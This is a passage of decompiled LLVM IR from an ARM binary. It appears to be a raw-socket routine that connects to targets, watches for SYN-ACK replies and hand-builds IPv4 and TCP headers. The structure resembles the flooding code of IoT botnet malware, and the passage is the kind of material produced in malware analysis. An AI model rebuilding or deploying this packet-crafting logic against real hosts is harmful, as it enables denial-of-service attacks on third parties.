  store i32 %v0_b488, i32* %r0.global-to-local, align 4
  %v5_b490 = inttoptr i32 %v0_b484 to i32*
  %v6_b490 = call i32 @function_8570(i32 %v0_b488, i32* %v5_b490, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4a0 = load i32, i32* @r5, align 4
  store i32 %v0_b4a0, i32* %r1.global-to-local, align 4
  %v0_b4a4 = load i32, i32* @r4, align 4
  store i32 %v0_b4a4, i32* %r0.global-to-local, align 4
  %v4_b4a8 = inttoptr i32 %v0_b4a0 to i32*
  %v5_b4a8 = call i32 @function_8570(i32 %v0_b4a4, i32* %v4_b4a8, i32 1, i32 1)
  %v1_b4b0 = urem i32 %v5_b4a8, 256
  store i32 %v1_b4b0, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b4c4 = call i32 @function_11aec(i32 2, i32 3, i32 6)
  store i32 %v3_b4c4, i32* %r0.global-to-local, align 4
  %v7_b4c8 = icmp eq i32 %v3_b4c4, -1
  store i1 %v7_b4c8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b4c4, i32* @sb, align 4
  br i1 %v7_b4c8, label %dec_label_pc_b6b8, label %dec_label_pc_b4d4

dec_label_pc_b4d4:                                ; preds = %dec_label_pc_b2f0
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b4dc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b4dc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b4f0 = call i32 @function_11aa8(i32 %v3_b4c4, i32 0, i32 3, i32 %v6_b4dc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b4f0, i32* %r0.global-to-local, align 4
  %v7_b4f4 = icmp eq i32 %v5_b4f0, -1
  store i1 %v7_b4f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b4f4, label %dec_label_pc_b6b0, label %dec_label_pc_b4fc

dec_label_pc_b4fc:                                ; preds = %dec_label_pc_b4d4
  %v0_b4fc = load i32, i32* @r7, align 4
  %v3_b4fc = mul i32 %v0_b4fc, 65536
  store i32 %v3_b4fc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_b504 = load i32, i32* @r6, align 4
  %v2_b504 = icmp eq i32 %v0_b504, 0
  store i1 %v2_b504, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_b50c = urem i32 %v0_b4fc, 65536
  store i32 %v3_b50c, i32* @fp, align 4
  br i1 %v2_b504, label %dec_label_pc_b93c, label %dec_label_pc_b514.preheader

dec_label_pc_b514.preheader:                      ; preds = %dec_label_pc_b4fc
  %v2_b560 = ptrtoint i32* %stack_var_-144 to i32
  %v2_b5a4 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b5dc = ptrtoint i32* %stack_var_-80 to i32
  %v2_b5e8 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b5ec = ptrtoint i32* %stack_var_-48 to i32
  %v4_b64c = zext i8 %tmp to i32
  %v1_b650 = and i32 %v4_b64c, 18
  %v2_b654 = icmp eq i32 %v1_b650, 18
  %v4_b7f8 = sext i8 %v5_b354 to i32
  %sext = mul i32 %v5_b370, 16777216
  %v4_b808 = sdiv i32 %sext, 16777216
  %v3_b638 = sext i16 %tmp61 to i32
  %v1_b65c = and i32 %v4_b64c, 5
  %v2_b65c = icmp eq i32 %v1_b65c, 0
  %v4_b59c = add i32 %v2_b560, 82
  %v5_b59c = inttoptr i32 %v4_b59c to i16*
  %v1_b78c = add i32 %v6_b490, 40
  %v1_b8a0 = urem i32 %v5_b3d0, 2
  %tmp97 = sub nsw i32 0, %v1_b8a0
  %v4_b8a8 = and i32 %tmp97, 32
  %v1_b8b8 = urem i32 %v6_b3f0, 2
  %tmp98 = sub nsw i32 0, %v1_b8b8
  %v4_b8c0 = and i32 %tmp98, 16
  %v1_b8d0 = urem i32 %v6_b410, 2
  %tmp99 = sub nsw i32 0, %v1_b8d0
  %v4_b8d8 = and i32 %tmp99, 8
  %v1_b8e8 = urem i32 %v6_b430, 2
  %tmp100 = sub nsw i32 0, %v1_b8e8
  %v4_b8f0 = and i32 %tmp100, 4
  %v1_b900 = urem i32 %v6_b450, 2
  %tmp101 = sub nsw i32 0, %v1_b900
  %v3_b908 = and i32 %tmp101, 2
  %v1_b918 = urem i32 %v6_b470, 2
  br label %dec_label_pc_b514

dec_label_pc_b514:                                ; preds = %dec_label_pc_b514.preheader, %dec_label_pc_b688
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b688 ], [ %tmp34, %dec_label_pc_b514.preheader ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b688 ], [ %tmp37, %dec_label_pc_b514.preheader ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b520 = call i32 @function_11aec(i32 2, i32 1, i32 0)
  store i32 %v3_b520, i32* %r0.global-to-local, align 4
  %v7_b524 = icmp eq i32 %v3_b520, -1
  store i1 %v7_b524, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b520, i32* @r5, align 4
  br i1 %v7_b524, label %dec_label_pc_b688, label %dec_label_pc_b530

dec_label_pc_b530:                                ; preds = %dec_label_pc_b514, %dec_label_pc_b664
  %v0_b538 = phi i32 [ %v3_b678, %dec_label_pc_b664 ], [ %v3_b520, %dec_label_pc_b514 ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b664 ], [ %stack_var_-62.0, %dec_label_pc_b514 ]
  %stack_var_-60.1 = phi i32 [ %v0_b738, %dec_label_pc_b664 ], [ %stack_var_-60.0, %dec_label_pc_b514 ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b538 = call i32 @function_11140(i32 %v0_b538, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b540 = or i32 %v2_b538, 2048
  store i32 %v1_b540, i32* %r2.global-to-local, align 4
  %v0_b544 = load i32, i32* @r5, align 4
  store i32 %v0_b544, i32* %r0.global-to-local, align 4
  %v2_b548 = call i32 @function_11140(i32 %v0_b544, i32 4)
  %v3_b54c = load i32, i32* %stack_var_-44, align 4
  %v5_b554 = mul i32 %v3_b54c, 24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %v2_b560, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v2_b568 = add i32 %v5_b554, %arg2
  store i32 %v2_b568, i32* %r3.global-to-local, align 4
  %v1_b56c = add i32 %v2_b568, 20
  %v2_b56c = inttoptr i32 %v1_b56c to i8*
  %v3_b56c = load i8, i8* %v2_b56c, align 1
  %v4_b56c = zext i8 %v3_b56c to i32
  store i32 %v4_b56c, i32* %r2.global-to-local, align 4
  %v2_b570 = icmp ugt i8 %v3_b56c, 30
  %v7_b570 = icmp eq i8 %v3_b56c, 31
  store i1 %v7_b570, i1* %cpsr_z.global-to-local, align 1
  %v2_b574 = xor i1 %v7_b570, true
  %v3_b574 = and i1 %v2_b570, %v2_b574
  br i1 %v3_b574, label %bb, label %bb71

bb:                                               ; preds = %dec_label_pc_b530
  %v5_b574 = add i32 %v2_b568, 16
  %v6_b574 = inttoptr i32 %v5_b574 to i32*
  %v7_b574 = load i32, i32* %v6_b574, align 4
  store i32 %v7_b574, i32* %r3.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %dec_label_pc_b530, %bb
  %v4_b578 = phi i32 [ %v2_b568, %dec_label_pc_b530 ], [ %v7_b574, %bb ]
  %v4_b578.stack_var_-60.1 = select i1 %v3_b574, i32 %v4_b578, i32 %stack_var_-60.1
  %v2_b57c = xor i1 %v2_b570, true
  %v3_b57c = or i1 %v7_b570, %v2_b57c
  br i1 %v3_b57c, label %dec_label_pc_b6c4, label %dec_label_pc_b580

dec_label_pc_b580:                                ; preds = %bb71, %dec_label_pc_b6c4
  %v0_b738 = phi i32 [ %v5_b714, %dec_label_pc_b6c4 ], [ %v4_b578.stack_var_-60.1, %bb71 ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b588 = load i32, i32* @sl, align 4
  %v9_b588 = icmp eq i32 %v0_b588, 65535
  store i1 %v9_b588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b588, label %dec_label_pc_b720, label %.thread9

.thread9:                                         ; preds = %dec_label_pc_b580
  %v4_b58c = udiv i32 %v0_b588, 256
  %v2_b590 = urem i32 %v0_b588, 256
  store i32 %v2_b590, i32* %r2.global-to-local, align 4
  %v5_b594 = mul nuw nsw i32 %v2_b590, 256
  %v6_b594 = or i32 %v5_b594, %v4_b58c
  store i32 %v6_b594, i32* %r3.global-to-local, align 4
  store i32 %v2_b560, i32* %r0.global-to-local, align 4
  %v2_b59c = trunc i32 %v6_b594 to i16
  store i16 %v2_b59c, i16* %v5_b59c, align 2
  br label %dec_label_pc_b5a4

dec_label_pc_b5a4:                                ; preds = %.thread9, %dec_label_pc_b720
  %stack_var_-62.2 = phi i16 [ %v1_b720, %dec_label_pc_b720 ], [ %stack_var_-62.1, %.thread9 ]
  store i32 %v2_b5a4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b5ac = load i32, i32* @r5, align 4
  store i32 %v0_b5ac, i32* %r0.global-to-local, align 4
  %v3_b5b0 = call i32 @function_118d4(i32 %v0_b5ac, i32 %v2_b5a4, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b5b8 = call i32 @function_10f8c(i32* null)
  store i32 %v2_b5b8, i32* %r0.global-to-local, align 4
  store i32 %v2_b5b8, i32* @r4, align 4
  %v9_b618 = icmp eq i32 %tmp35, %v0_b738
  %v4_b640 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b618 to i32
  %v9_b62c = icmp eq i1 %v9_b618, false
  %v9_b644 = icmp eq i32 %v3_b638, %v4_b640
  br label %dec_label_pc_b5d4

dec_label_pc_b5c4:                                ; preds = %.thread, %dec_label_pc_b634, %dec_label_pc_b65c, %bb75
  %v2_b5c4 = call i32 @function_10f8c(i32* null)
  %v0_b5c8 = load i32, i32* @r4, align 4
  %v2_b5c8 = sub i32 %v2_b5c4, %v0_b5c8
  store i32 %v2_b5c8, i32* %r0.global-to-local, align 4
  %v7_b5cc = icmp eq i32 %v2_b5c8, 10
  store i1 %v7_b5cc, i1* %cpsr_z.global-to-local, align 1
  %v8_b5d0 = icmp sgt i32 %v2_b5c8, 10
  br i1 %v8_b5d0, label %dec_label_pc_b664, label %dec_label_pc_b5d4

dec_label_pc_b5d4:                                ; preds = %dec_label_pc_b5c4, %dec_label_pc_b5a4
  store i32 16, i32* %stack_var_-48, align 4
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 %v2_b5e8, i32* %r1.global-to-local, align 4
  store i32 %v2_b5ec, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b5f4 = load i32, i32* @sb, align 4
  store i32 %v0_b5f4, i32* %r0.global-to-local, align 4
  %v6_b5fc = call i32 @function_119f4(i32 %v0_b5f4, i32 %v2_b5e8, i32 256, i32 16384, i32 %v2_b5dc, i32 %v2_b5ec)
  store i32 %v6_b5fc, i32* %r2.global-to-local, align 4
  %v7_b604 = icmp eq i32 %v6_b5fc, -1
  store i1 %v7_b604, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b604, label %dec_label_pc_b6b8, label %dec_label_pc_b610

dec_label_pc_b610:                                ; preds = %dec_label_pc_b5d4
  store i32 %v0_b738, i32* %r1.global-to-local, align 4
  store i32 %tmp35, i32* @r3, align 4
  store i32 %., i32* %ip.global-to-local, align 4
  %v7_b624 = icmp eq i32 %v6_b5fc, 40
  store i1 %v7_b624, i1* %cpsr_z.global-to-local, align 1
  %tmp102 = icmp ult i32 %v6_b5fc, 41
  br i1 %tmp102, label %.thread, label %bb75

.thread:                                          ; preds = %dec_label_pc_b610
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b5c4

bb75:                                             ; preds = %dec_label_pc_b610
  store i1 %v9_b62c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b62c, label %dec_label_pc_b5c4, label %dec_label_pc_b634

dec_label_pc_b634:                                ; preds = %bb75
  store i32 %v3_b638, i32* @lr, align 4
  store i32 %v2_b560, i32* @r3, align 4
  store i32 %v4_b640, i32* %r2.global-to-local, align 4
  store i1 %v9_b644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b644, label %dec_label_pc_b64c, label %dec_label_pc_b5c4

dec_label_pc_b64c:                                ; preds = %dec_label_pc_b634
  store i32 %v4_b64c, i32* %r2.global-to-local, align 4
  store i32 %v1_b650, i32* @r3, align 4
  store i1 %v2_b654, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b654, label %dec_label_pc_b730, label %dec_label_pc_b65c

dec_label_pc_b65c:                                ; preds = %dec_label_pc_b64c
  store i1 %v2_b65c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b65c, label %dec_label_pc_b5c4, label %dec_label_pc_b664

dec_label_pc_b664:                                ; preds = %dec_label_pc_b65c, %dec_label_pc_b5c4
  %v0_b664 = load i32, i32* @r5, align 4
  store i32 %v0_b664, i32* %r0.global-to-local, align 4
  %v1_b668 = call i32 @function_1130c(i32 %v0_b664)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b678 = call i32 @function_11aec(i32 2, i32 1, i32 0)
  store i32 %v3_b678, i32* %r0.global-to-local, align 4
  %v3_b67c = icmp eq i32 %v3_b678, -1
  %v8_b67c = icmp eq i32 %v3_b678, -1
  store i1 %v8_b67c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b678, i32* @r5, align 4
  br i1 %v3_b67c, label %dec_label_pc_b688, label %dec_label_pc_b530

dec_label_pc_b688:                                ; preds = %dec_label_pc_b664, %dec_label_pc_b514, %bb82
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b514 ], [ %stack_var_-62.2, %bb82 ], [ %stack_var_-62.2, %dec_label_pc_b664 ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b514 ], [ %v0_b738, %bb82 ], [ %v0_b738, %dec_label_pc_b664 ]
  %v3_b688 = load i32, i32* %stack_var_-44, align 4
  %v1_b68c = add i32 %v3_b688, 1
  store i32 %v1_b68c, i32* @r3, align 4
  %v1_b690 = load i32, i32* @r6, align 4
  %v9_b690 = icmp eq i32 %v1_b68c, %v1_b690
  store i1 %v9_b690, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b68c, i32* %stack_var_-44, align 4
  %v5_b698 = icmp slt i32 %v1_b68c, %v1_b690
  br i1 %v5_b698, label %dec_label_pc_b514, label %dec_label_pc_b69c

dec_label_pc_b69c:                                ; preds = %dec_label_pc_b688
  store i32 %v6_b490, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b94c

dec_label_pc_b6b0:                                ; preds = %dec_label_pc_b4d4
  %v0_b6b0 = load i32, i32* @sb, align 4
  store i32 %v0_b6b0, i32* %r0.global-to-local, align 4
  %v1_b6b4 = call i32 @function_1130c(i32 %v0_b6b0)
  store i32 %v1_b6b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6b8

dec_label_pc_b6b8:                                ; preds = %dec_label_pc_b5d4, %dec_label_pc_b2f0, %dec_label_pc_b6b0
  %v1_b6c0 = phi i32 [ %v3_b4c4, %dec_label_pc_b2f0 ], [ %v1_b6b4, %dec_label_pc_b6b0 ], [ 0, %dec_label_pc_b5d4 ]
  store i32 %v27_b2f0, i32* %lr.global-to-local, align 4
  ret i32 %v1_b6c0

dec_label_pc_b6c4:                                ; preds = %bb71
  %v1_b6c4 = add i32 %v4_b578, 16
  %v2_b6c4 = inttoptr i32 %v1_b6c4 to i32*
  %v3_b6c4 = load i32, i32* %v2_b6c4, align 4
  store i32 %v3_b6c4, i32* @r4, align 4
  %v0_b6c8 = call i32 @function_e0d0()
  store i32 %v0_b6c8, i32* %r0.global-to-local, align 4
  %v3_b6cc = load i32, i32* %stack_var_-44, align 4
  %v5_b6d4 = mul i32 %v3_b6cc, 24
  %v0_b6dc = load i32, i32* @r4, align 4
  %v1_b6dc = and i32 %v0_b6dc, 16711680
  store i32 %v1_b6dc, i32* %ip.global-to-local, align 4
  %v3_b6e0 = udiv i32 %v0_b6dc, 16777216
  %v2_b6e4 = add i32 %v5_b6d4, %arg2
  store i32 %v2_b6e4, i32* %r1.global-to-local, align 4
  %v4_b6e8 = udiv i32 %v1_b6dc, 256
  %v5_b6e8 = or i32 %v4_b6e8, %v3_b6e0
  store i32 %v5_b6e8, i32* %r2.global-to-local, align 4
  %v1_b6ec = and i32 %v0_b6dc, 65280
  store i32 %v1_b6ec, i32* %r3.global-to-local, align 4
  %v1_b6f0 = add i32 %v2_b6e4, 20
  %v2_b6f0 = inttoptr i32 %v1_b6f0 to i8*
  %v3_b6f0 = load i8, i8* %v2_b6f0, align 1
  %v4_b6f0 = zext i8 %v3_b6f0 to i32
  store i32 %v4_b6f0, i32* %ip.global-to-local, align 4
  %v5_b6f8 = call i32 @llvm.bswap.i32(i32 %v0_b6dc)
  %v7_b6fc = lshr i32 %v0_b6c8, %v4_b6f0
  %v8_b6fc = add i32 %v7_b6fc, %v5_b6f8
  store i32 %v8_b6fc, i32* %r2.global-to-local, align 4
  %v1_b700 = and i32 %v8_b6fc, 16711680
  store i32 %v1_b700, i32* %r0.global-to-local, align 4
  %v1_b70c = and i32 %v8_b6fc, 65280
  store i32 %v1_b70c, i32* %r1.global-to-local, align 4
  %v5_b714 = call i32 @llvm.bswap.i32(i32 %v8_b6fc)
  store i32 %v5_b714, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b580

dec_label_pc_b720:                                ; preds = %dec_label_pc_b580
  %v0_b720 = call i32 @function_e0d0()
  %v1_b720 = trunc i32 %v0_b720 to i16
  store i32 %v0_b720, i32* %r0.global-to-local, align 4
  store i32 %v2_b560, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_b5a4

dec_label_pc_b730:                                ; preds = %dec_label_pc_b64c
  %v3_b730 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b730, i32* @r4, align 4
  store i32 %v2_b30c, i32* %ip.global-to-local, align 4
  %v5_b738 = mul i32 %v3_b730, 16
  %v6_b738 = add i32 %v5_b738, %v2_b30c
  %v7_b738 = inttoptr i32 %v6_b738 to i32*
  store i32 %v0_b738, i32* %v7_b738, align 4
  %v0_b73c = load i32, i32* @r8, align 4
  %v1_b73c = add i32 %v0_b73c, 4
  %v2_b73c = inttoptr i32 %v1_b73c to i32*
  %v3_b73c = load i32, i32* %v2_b73c, align 4
  store i32 %v3_b73c, i32* %r1.global-to-local, align 4
  %v1_b748 = and i32 %v3_b73c, 65280
  store i32 %v1_b748, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r0.global-to-local, align 4
  %v0_b758 = load i32, i32* @r4, align 4
  %v3_b758 = mul i32 %v0_b758, 16
  %v2_b75c = add i32 %v3_b758, %v2_b30c
  store i32 %v2_b75c, i32* %ip.global-to-local, align 4
  %v5_b760 = call i32 @llvm.bswap.i32(i32 %v3_b73c)
  store i32 %v5_b760, i32* %r3.global-to-local, align 4
  %v2_b764 = add i32 %v2_b75c, 4
  %v3_b764 = inttoptr i32 %v2_b764 to i32*
  store i32 %v5_b760, i32* %v3_b764, align 4
  %v0_b768 = load i32, i32* @r8, align 4
  %v1_b768 = add i32 %v0_b768, 8
  %v2_b768 = inttoptr i32 %v1_b768 to i32*
  %v3_b768 = load i32, i32* %v2_b768, align 4
  store i32 %v3_b768, i32* %r1.global-to-local, align 4
  %v1_b76c = and i32 %v3_b768, 16711680
  store i32 %v1_b76c, i32* %r0.global-to-local, align 4
  store i32 %v6_b490, i32* %r2.global-to-local, align 4
  %v5_b784 = call i32 @llvm.bswap.i32(i32 %v3_b768)
  store i32 %v5_b784, i32* %r3.global-to-local, align 4
  %v1_b788 = add i32 %v0_b768, 2
  %v2_b788 = inttoptr i32 %v1_b788 to i16*
  %v3_b788 = load i16, i16* %v2_b788, align 2
  %v4_b788 = zext i16 %v3_b788 to i32
  store i32 %v4_b788, i32* %r1.global-to-local, align 4
  store i32 %v1_b78c, i32* @r7, align 4
  %v0_b790 = load i32, i32* @lr, align 4
  %v1_b790 = trunc i32 %v0_b790 to i16
  %v2_b790 = load i32, i32* %ip.global-to-local, align 4
  %v3_b790 = add i32 %v2_b790, 14
  %v4_b790 = inttoptr i32 %v3_b790 to i16*
  store i16 %v1_b790, i16* %v4_b790, align 2
  %v0_b794 = load i32, i32* %r1.global-to-local, align 4
  %v1_b794 = trunc i32 %v0_b794 to i16
  %v2_b794 = load i32, i32* %ip.global-to-local, align 4
  %v3_b794 = add i32 %v2_b794, 12
  %v4_b794 = inttoptr i32 %v3_b794 to i16*
  store i16 %v1_b794, i16* %v4_b794, align 2
  %v0_b798 = load i32, i32* %r3.global-to-local, align 4
  %v1_b798 = load i32, i32* %ip.global-to-local, align 4
  %v2_b798 = add i32 %v1_b798, 8
  %v3_b798 = inttoptr i32 %v2_b798 to i32*
  store i32 %v0_b798, i32* %v3_b798, align 4
  %v0_b79c = load i32, i32* @r7, align 4
  store i32 %v0_b79c, i32* @r0, align 4
  %v0_b7a0 = call i32 @function_11d34()
  store i32 %v0_b7a0, i32* %r0.global-to-local, align 4
  store i32 %v2_b31c, i32* %r3.global-to-local, align 4
  %v2_b7ac = load i32, i32* @r4, align 4
  %v5_b7ac = mul i32 %v2_b7ac, 4
  %v6_b7ac = add i32 %v5_b7ac, %v2_b31c
  %v7_b7ac = inttoptr i32 %v6_b7ac to i32*
  store i32 %v0_b7a0, i32* %v7_b7ac, align 4
  %v3_b7b0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b7b0, i32* %r2.global-to-local, align 4
  %v0_b7b4 = load i32, i32* %r3.global-to-local, align 4
  %v4_b7b4 = mul i32 %v3_b7b0, 4
  %v5_b7b4 = add i32 %v0_b7b4, %v4_b7b4
  %v6_b7b4 = inttoptr i32 %v5_b7b4 to i32*
  %v7_b7b4 = load i32, i32* %v6_b7b4, align 4
  store i32 %v7_b7b4, i32* @r4, align 4
  %v1_b7b8 = inttoptr i32 %v7_b7b4 to i8*
  %v2_b7b8 = load i8, i8* %v1_b7b8, align 1
  %tmp103 = urem i8 %v2_b7b8, 16
  %v1_b7bc = zext i8 %tmp103 to i32
  %v1_b7c0 = or i32 %v1_b7bc, 64
  store i32 %v1_b7c0, i32* %r3.global-to-local, align 4
  %v1_b7c4 = trunc i32 %v1_b7c0 to i8
  store i8 %v1_b7c4, i8* %v1_b7b8, align 1
  %v0_b7c8 = load i32, i32* @r4, align 4
  %v1_b7c8 = inttoptr i32 %v0_b7c8 to i8*
  %v2_b7c8 = load i8, i8* %v1_b7c8, align 1
  %v0_b7cc = load i32, i32* @r7, align 4
  %tmp77 = mul i32 %v0_b7cc, 256
  %v1_b7d4 = and i8 %v2_b7c8, -16
  %v1_b7d8 = or i8 %v1_b7d4, 5
  %v1_b7dc = and i32 %tmp77, 65280
  %tmp78 = udiv i32 %v0_b7cc, 256
  %v4_b7e0 = urem i32 %tmp78, 256
  %v5_b7e0 = or i32 %v4_b7e0, %v1_b7dc
  store i32 %v5_b7e0, i32* %r2.global-to-local, align 4
  %v0_b7e4 = load i32, i32* @fp, align 4
  %v1_b7e4 = urem i32 %v0_b7e4, 256
  store i32 %v1_b7e4, i32* %r0.global-to-local, align 4
  store i32 %v1_b39c, i32* %ip.global-to-local, align 4
  %v3_b7ec = udiv i32 %v0_b7e4, 256
  store i32 %v3_b7ec, i32* %r1.global-to-local, align 4
  store i8 %v1_b7d8, i8* %v1_b7c8, align 1
  %v0_b7f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b7f4 = load i32, i32* %r0.global-to-local, align 4
  %v4_b7f4 = mul i32 %v1_b7f4, 256
  %v5_b7f4 = or i32 %v4_b7f4, %v0_b7f4
  store i32 %v5_b7f4, i32* %r1.global-to-local, align 4
  store i32 %v4_b7f8, i32* %r0.global-to-local, align 4
  %v2_b7fc = load i32, i32* @r4, align 4
  %v3_b7fc = add i32 %v2_b7fc, 1
  %v4_b7fc = inttoptr i32 %v3_b7fc to i8*
  store i8 %v5_b354, i8* %v4_b7fc, align 1
  %v0_b800 = load i32, i32* %r1.global-to-local, align 4
  %v1_b800 = trunc i32 %v0_b800 to i16
  %v2_b800 = load i32, i32* @r4, align 4
  %v3_b800 = add i32 %v2_b800, 4
  %v4_b800 = inttoptr i32 %v3_b800 to i16*
  store i16 %v1_b800, i16* %v4_b800, align 2
  %v0_b804 = load i32, i32* %ip.global-to-local, align 4
  %v2_b804 = icmp eq i32 %v0_b804, 0
  store i1 %v2_b804, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_b808, i32* %r1.global-to-local, align 4
  %v0_b80c = load i32, i32* %r2.global-to-local, align 4
  %v1_b80c = trunc i32 %v0_b80c to i16
  %v2_b80c = load i32, i32* @r4, align 4
  %v3_b80c = add i32 %v2_b80c, 2
  %v4_b80c = inttoptr i32 %v3_b80c to i16*
  store i16 %v1_b80c, i16* %v4_b80c, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_b804, label %bb80, label %bb79

bb79:                                             ; preds = %dec_label_pc_b730
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb80

bb80:                                             ; preds = %dec_label_pc_b730, %bb79
  %v0_b818 = load i32, i32* %r1.global-to-local, align 4
  %v1_b818 = trunc i32 %v0_b818 to i8
  %v2_b818 = load i32, i32* @r4, align 4
  %v3_b818 = add i32 %v2_b818, 8
  %v4_b818 = inttoptr i32 %v3_b818 to i8*
  store i8 %v1_b818, i8* %v4_b818, align 1
  %v0_b81c = load i32, i32* %r3.global-to-local, align 4
  %v1_b81c = trunc i32 %v0_b81c to i8
  %v2_b81c = load i32, i32* @r4, align 4
  %v3_b81c = add i32 %v2_b81c, 9
  %v4_b81c = inttoptr i32 %v3_b81c to i8*
  store i8 %v1_b81c, i8* %v4_b81c, align 1
  %v0_b820 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b820, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_b820 = load i32, i32* %r2.global-to-local, align 4
  %v2_b820 = trunc i32 %v1_b820 to i16
  %v3_b820 = load i32, i32* @r4, align 4
  %v4_b820 = add i32 %v3_b820, 6
  %v5_b820 = inttoptr i32 %v4_b820 to i16*
  store i16 %v2_b820, i16* %v5_b820, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_212d8.45 to i32), i32* %r2.global-to-local, align 4
  %v2_b828 = load i32, i32* @global_var_212d8.45, align 4
  store i32 %v2_b828, i32* %r1.global-to-local, align 4
  %v1_b82c = load i32, i32* @r4, align 4
  %v2_b82c = add i32 %v1_b82c, 12
  %v3_b82c = inttoptr i32 %v2_b82c to i32*
  store i32 %v2_b828, i32* %v3_b82c, align 4
  %v3_b830 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b830, i32* %r3.global-to-local, align 4
  store i32 %v2_b30c, i32* %ip.global-to-local, align 4
  %v4_b838 = mul i32 %v3_b830, 16
  %v5_b838 = add i32 %v4_b838, %v2_b30c
  %v6_b838 = inttoptr i32 %v5_b838 to i32*
  %v7_b838 = load i32, i32* %v6_b838, align 4
  store i32 %v7_b838, i32* %r2.global-to-local, align 4
  store i32 %v5_b838, i32* %r3.global-to-local, align 4
  %v1_b844 = load i32, i32* @r4, align 4
  %v2_b844 = add i32 %v1_b844, 16
  %v3_b844 = inttoptr i32 %v2_b844 to i32*
  store i32 %v7_b838, i32* %v3_b844, align 4
  %v0_b848 = load i32, i32* %r3.global-to-local, align 4
  %v1_b848 = add i32 %v0_b848, 12
  %v2_b848 = inttoptr i32 %v1_b848 to i16*
  %v3_b848 = load i16, i16* %v2_b848, align 2
  %v4_b848 = zext i16 %v3_b848 to i32
  store i32 %v4_b848, i32* %r0.global-to-local, align 4
  %v1_b84c = add i32 %v0_b848, 8
  %v2_b84c = inttoptr i32 %v1_b84c to i32*
  %v3_b84c = load i32, i32* %v2_b84c, align 4
  store i32 %v3_b84c, i32* %r1.global-to-local, align 4
  %v2_b850 = load i32, i32* @r4, align 4
  %v3_b850 = add i32 %v2_b850, 20
  %v4_b850 = inttoptr i32 %v3_b850 to i16*
  store i16 %v3_b848, i16* %v4_b850, align 2
  %v0_b854 = load i32, i32* @r4, align 4
  %v1_b854 = add i32 %v0_b854, 20
  store i32 %v1_b854, i32* @r8, align 4
  %v1_b858 = add i32 %v0_b854, 33
  %v2_b858 = inttoptr i32 %v1_b858 to i8*
  %v3_b858 = load i8, i8* %v2_b858, align 1
  %v4_b858 = zext i8 %v3_b858 to i32
  store i32 %v4_b858, i32* %r2.global-to-local, align 4
  %v0_b85c = load i32, i32* %r1.global-to-local, align 4
  %v2_b85c = add i32 %v0_b854, 24
  %v3_b85c = inttoptr i32 %v2_b85c to i32*
